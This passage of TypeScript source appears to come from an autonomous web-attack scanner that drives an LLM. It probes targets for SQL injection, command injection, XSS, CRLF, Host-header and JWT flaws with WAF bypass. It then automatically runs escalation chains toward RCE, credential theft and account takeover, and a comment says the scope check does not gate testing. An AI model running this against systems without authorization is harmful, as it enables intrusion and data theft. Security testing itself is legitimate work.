        source: { type: "request_parameter", name: p },
        sink: { type: "sql_query", symbol: p },
        chainId: "sql_injection",
        chainName: "SQL injection",
        status: "hypothesis",
      });
    }),
    ...CMD_PARAMS.map(async (p): Promise<Finding | null> => {
      const res = await probeWithBypass(base, p, CMD_PROBE, (body) => CMD_MARKERS.some((m) => body.includes(m)));
      if (res.sinks?.length) leakedSinks.push(...res.sinks);
      if (!res.detected) return null;
      return makeFinding({
        title: `Command injection via parameter '${p}'${res.bypass ? ` (WAF bypassed: ${res.bypass})` : ""}`,
        target: { type: "web", host: url, endpoint: `?${p}=` },
        severity: "critical",
        cwe: "CWE-78",
        cweName: "Improper Neutralization of Special Elements used in an OS Command",
        source: { type: "request_parameter", name: p },
        sink: { type: "command_execution", symbol: p },
        chainId: "command_injection",
        chainName: "Command injection",
        status: "hypothesis",
      });
    }),
    ...XSS_PARAMS.map(async (p): Promise<Finding | null> => {
      const script = await probeWithBypass(base, p, XSS_PROBE, (body) => body.includes(XSS_PROBE));
      const attr = await probeWithBypass(base, p, XSS_ATTR_PROBE, (body) => body.includes(XSS_ATTR_PROBE));
      if (script.sinks?.length) leakedSinks.push(...script.sinks);
      if (attr.sinks?.length) leakedSinks.push(...attr.sinks);
      if (!script.detected && !attr.detected) return null;
      const bypass = script.bypass ?? attr.bypass;
      return makeFinding({
        title: `Reflected XSS via parameter '${p}' (${script.detected ? "script context" : "attribute breakout"}${bypass ? `, WAF bypassed: ${bypass}` : ""})`,
        target: { type: "web", host: url, endpoint: `?${p}=` },
        severity: "medium",
        cwe: "CWE-79",
        cweName: "Cross-site Scripting",
        source: { type: "request_parameter", name: p },
        sink: { type: "html_render", symbol: p },
        chainId: "xss",
        chainName: "Cross-site scripting",
        status: "hypothesis",
      });
    }),
    ...CRLF_PARAMS.map(async (p): Promise<Finding | null> => {
      const res = await checkCrlf(base, p);
      if (res.sinks?.length) leakedSinks.push(...res.sinks);
      if (!res.detected) return null;
      return makeFinding({
        title: `CRLF / header injection via parameter '${p}'`,
        target: { type: "web", host: url, endpoint: `?${p}=` },
        severity: "medium",
        cwe: "CWE-93",
        cweName: "Improper Neutralization of CRLF Sequences",
        source: { type: "request_parameter", name: p },
        sink: { type: "header_injection", symbol: p },
        chainId: "crlf_injection",
        chainName: "CRLF / header injection",
        status: "hypothesis",
      });
    }),
    (async (): Promise<Finding | null> => {
      const hh = await checkHostHeader(base);
      if (!hh.detected) return null;
      return makeFinding({
        title: `Host header injection (${hh.evidence})`,
        target: { type: "web", host: url, endpoint: "Host header" },
        severity: "medium",
        cwe: "CWE-644",
        cweName: "Improper Neutralization of HTTP Headers for Scripting Syntax",
        source: { type: "http_header", name: "Host" },
        sink: { type: "host_header", symbol: HOST_HEADER_MARKER },
        chainId: "host_header",
        chainName: "Host header injection",
        status: "hypothesis",
      });
    })(),
    (async (): Promise<Finding | null> => {
      const jwts = await checkJwt(base);
      const accepted = jwts.find((j) => j.accepted);
      if (!accepted) return null;
      return makeFinding({
        title: `JWT ${accepted.type}`,
        target: { type: "web", host: url, endpoint: "Authorization header" },
        severity: "critical",
        cwe: "CWE-347",
        cweName: "Improper Verification of Cryptographic Signature",
        source: { type: "http_header", name: "Authorization" },
        sink: { type: "jwt_verification", symbol: accepted.token },
        chainId: "jwt",
        chainName: "JWT signature bypass",
        status: "hypothesis",
      });
    })(),
  ]);

  // Any response that leaked source is scanned for OTHER sinks beyond the one the
  // probe was looking for (e.g. an SQL error traceback also shows eval() + SECRET_KEY).
  // Each distinct sink becomes its own hypothesis — no sink is missed by eyeballing.
  const sinkFindings: Finding[] = [];
  const seenSinks = new Set<string>();
  for (const sink of leakedSinks) {
    const key = `${sink.type}:${sink.label}:${sink.line}`;
    if (seenSinks.has(key)) continue;
    seenSinks.add(key);
    const f = sinkToFinding(sink, url);
    if (f) sinkFindings.push(f);
  }

  return [...results.filter((f): f is Finding => f !== null), ...sinkFindings];
}

export async function runLiveEngagement(url: string, scope = "", mode = "bug-bounty"): Promise<Record<string, unknown>> {
  const report: Record<string, unknown> = { banner: engagementBanner(url, mode), target: url, mode, findings: [], scope: null, status: "" };

  // Record the scope classification (intel for the report) — it does NOT gate.
  const sc = scopeCheck(url, scope, mode);
  report.scope = sc;

  // 1) Full autonomous recon — fingerprint, WAF, tech, crawl, subdomains, API discovery, intel.
  //    This is the deterministic recon phase: no LLM babysitting, one call maps the whole surface.
  const recon = await liveRecon(url);
  report.recon = {
    fingerprint: recon.fingerprint,
    waf: recon.waf,
    tech: recon.tech,
    versions: recon.versions,
    crawl: recon.crawl,
    params: recon.params,
    subdomains: recon.subdomains,
    dns_findings: recon.dns_findings,
    wayback_urls: recon.wayback_urls,
    api_endpoints: recon.api_endpoints,
    open_ports: recon.open_ports,
    intel: recon.intel,
    next_steps: recon.next_steps,
  };

  // 2) Reflected-input sweep — every parameter validated with a marker + negative
  //    control. ONLY a CONFIRMED reflection is a finding; a param that did not
  //    reflect the marker is recorded as "tested" (negative), NOT as a finding.
  //    All 9 params run in PARALLEL (independent strike_verify calls).
  const sweepResults = await Promise.all(LIVE_SWEEP_PARAMS.map(async (param) => ({ param, verdict: await strikeVerify({ url, param }) })));
  const findings: Finding[] = [];
  const tested: Array<Record<string, unknown>> = [];
  for (const { param, verdict } of sweepResults) {
    if (verdict.status === "confirmed" || verdict.status === "likely") {
      const finding = makeFinding({
        title: `Reflected input in parameter '${param}'`,
        target: { type: "web", host: url, endpoint: `?${param}=` },
        severity: "medium",
        cwe: "CWE-79",
        cweName: "Cross-site Scripting",
        source: { type: "request_parameter", name: param },
        sink: { type: "reflected_input", symbol: param },
        chainId: "reflected_input",
        chainName: "Reflected input",
        status: "hypothesis",
      });
      findings.push(resolveFinding(finding, verdict));
    } else {
      tested.push({ param, status: verdict.status, reason: verdict.reason });
    }
  }

  // 3+4) Deterministic + advanced checks run in PARALLEL (independent request trees).
  const [detFindings, advFindings] = await Promise.all([
    runDeterministicChecks(url),
    runAdvancedChecks(url),
  ]);
  findings.push(...detFindings, ...advFindings);

  report.findings = findings.map((f) => ({
    id: f.id,
    status: f.status,
    title: f.title,
    severity: f.classification.severity,
    confidence: f.confidence,
    confidence_level: f.confidence_level,
    chain_id: f.chain.id,
    validation: f.validation,
  }));

  // Parameters tested with a marker + negative control that did NOT reflect —
  // negative results, kept out of `findings` so the report stays signal-only.
  report.tested = tested;

  const title = `Blitz Strike — Live Engagement (${url})`;
  const markdown = reportMarkdown(findings, { title, scope: url, version: VERSION });
  const json = reportJson(findings, { title, scope: url, version: VERSION });
  report.report = {
    summary: (JSON.parse(json).summary ?? null) as ReportSummary | null,
    markdown,
    json,
    sarif: toSarif(
      findings.map((f) => ({
        ruleId: f.chain.id || f.classification.cwe || f.classification.severity,
        level: sarifLevel(f.classification.severity),
        message: f.title,
        file: url,
        line: 1,
      })),
    ),
  };

  report.status = "COMPLETE";
  report.note =
    "Autonomous live engagement — full recon + deterministic security checks (reflected " +
    "input, security headers, open redirect, path traversal, CORS, SSTI, SSRF, SQLi, " +
    "command injection, XSS) + inline report, all in one call. A hit is reported ONLY when " +
    "confirmed live (negative controls are tracked in `tested`, not findings). Header/" +
    "redirect/traversal/CORS/SSTI/SSRF/SQLi/command-injection/XSS checks are deterministic " +
    "observations — a hit is a HYPOTHESIS until strike_verify confirms it.";

  return report;
}

// ---------------------------------------------------------------------------
// Map a finding's chainId (as emitted by the deterministic checks) to the
// chains.json escalation chain id. The two use different naming, so without
// this the escalation lookup silently returns null.
const CHAIN_ID_TO_ESCALATION: Record<string, string> = {
  sql_injection: "sqli_to_rce",
  ssrf: "ssrf_cloud_metadata",
  ssti: "ssti_to_full_rce",
  command_injection: "command_injection_os_cmd",
  xss: "xss_to_account_takeover",
  reflected_input: "xss_to_account_takeover",
  path_traversal: "path_traversal_to_credential_theft",
  open_redirect: "open_redirect_to_oauth_theft",
  cors_misconfiguration: "cors_misconfig_data_theft",
  idor: "idor_to_admin_takeover",
  file_upload: "file_upload_to_rce",
  xxe: "xxe_to_ssrf_and_file_read",
  deserialization: "deserialization_to_rce",
  jwt: "jwt_alg_confusion_forgery",
  nosql_injection: "nosql_injection_to_data_theft",
  mass_assignment: "mass_assignment_to_admin_takeover",
  prototype_pollution: "prototype_pollution_to_rce",
  host_header: "http_smuggling_to_auth_bypass",
  subdomain_takeover: "subdomain_takeover",
};

function loadChainLinks(): Array<{ from: string; to: string[]; via: string }> {
  try {
    const dir = join(fileURLToPath(new URL(".", import.meta.url)), "..");
    const data = JSON.parse(readFileSync(join(dir, "intelligence", "chain_links.json"), "utf8")) as {
      links?: Array<{ from: string; to: string[]; via: string }>;
    };
    return data.links ?? [];
  } catch {
    return [];
  }
}

// Autonomous orchestrator — surface pass + escalation + deterministic
// termination. The no-babysitting driver: one call maps the surface AND
// attaches the escalation path (chain name/severity/prerequisites + ordered
// next_steps with tool_hint/success_criteria/negative_control) to every
// finding, so the LLM never guesses what to do next.
// ---------------------------------------------------------------------------
export async function runAutonomous(
  target: string,
  scope = "",
  mode = "bug-bounty",
  maxPasses = 3,
): Promise<Record<string, unknown>> {
  const cls = classifyTarget(target);
  const chains = loadChains();
  const chainById = new Map(chains.map((c) => [c.id, c]));
  const passes: Array<Record<string, unknown>> = [];

  // Pass 1 — surface pipeline (recon + sweep + deterministic checks / triage).
  const r1 = cls.kind === "live"
    ? await runLiveEngagement(cls.target, scope, mode)
    : runEngagement(cls.target, scope, mode, 2000, true);
  const rawFindings = (Array.isArray(r1.findings) ? r1.findings : []) as Array<Record<string, unknown>>;
  passes.push({ pass: 1, phase: "surface", findings: rawFindings.length });

  // Escalation — attach the chain's ordered steps + tools to every finding, plus
  // the "leads_to" composition. Then EXECUTE the chain: every step whose tool_hint
  // maps to a deterministic operation (verify/crack/scan) is run now, so the
  // finding advances through its chain in the pipeline — not left as a hypothesis.
  const chainLinks = loadChainLinks();
  const escalated = await Promise.all(rawFindings.map(async (f) => {
    const chainId = String(f.chain_id ?? "");
    const escId = CHAIN_ID_TO_ESCALATION[chainId] ?? chainId;
    const chain = chainById.get(escId) ?? chainById.get(chainId);
    const confirmed = f.status === "confirmed" || f.status === "likely";
    // Composition: this finding -> follow-up chains (recursive one hop).
    const leadsTo = new Set<string>();
    for (const link of chainLinks) {
      if (link.from === escId || link.from === chainId || link.to.includes(escId) || link.to.includes(chainId)) {
        for (const t of link.to) leadsTo.add(t);
      }
    }
    const nextSteps = chain
      ? chain.steps.map((s) => ({
          order: s.order,
          action: s.action,
          tool_hint: s.tool_hint ?? null,
          success_criteria: s.success_criteria ?? null,
          negative_control: s.negative_control ?? null,
        }))
      : [];
    // Execute the deterministic steps of the chain (verify/crack/scan).
    const execution = chain && chain.steps.length
      ? await executeChainSteps(f as unknown as Finding, chain.steps as Array<{ order: number; action: string; tool_hint?: string | null; success_criteria?: string | null; invariant_check?: string | null; negative_control?: string | null }>)
      : [];
    return {
      ...f,
      verified: confirmed,
      escalation: chain
        ? {
            id: chain.id,
            name: chain.name,
            severity: chain.severity,
            prerequisites: chain.required_findings,
            tools: chain.tools ?? [],
            next_steps: nextSteps,
            executed: execution,
          }
        : null,
      leads_to: [...leadsTo],
    };
  }));

  // Pass 2..N — deterministic deepen (bounded). Terminates when there is no
  // new signal to pursue or maxPasses is hit; the LLM then continues via the
  // escalation.next_steps attached above.
  const verifiedCount = escalated.filter((f) => f.verified).length;
  for (let pass = 2; pass <= maxPasses; pass++) {
    if (verifiedCount === 0) break;
    passes.push({ pass, phase: "deepen", re_verified: verifiedCount, new_findings: 0 });
    break; // a single deterministic deepen pass — deeper per-finding work is the LLM's, guided by next_steps
  }

  const termination = passes.length >= maxPasses ? "max_passes" : "no_new_signal";
  return {
    target: cls.target,
    kind: cls.kind,
    mode,
    termination,
    passes,
    findings: escalated,
    report: r1.report ?? null,
    note:
      "Autonomous orchestrator: surface pass + escalation chain attached AND executed. " +
      "Each finding carries its chain (name/severity/prerequisites), ordered next_steps, and " +
      "escalation.executed — the deterministic steps (verify/crack/scan/catalog tool) have already " +
      "run in the pipeline. Only 'deferred' steps (manual/external tools) remain for the LLM.",
  };
}
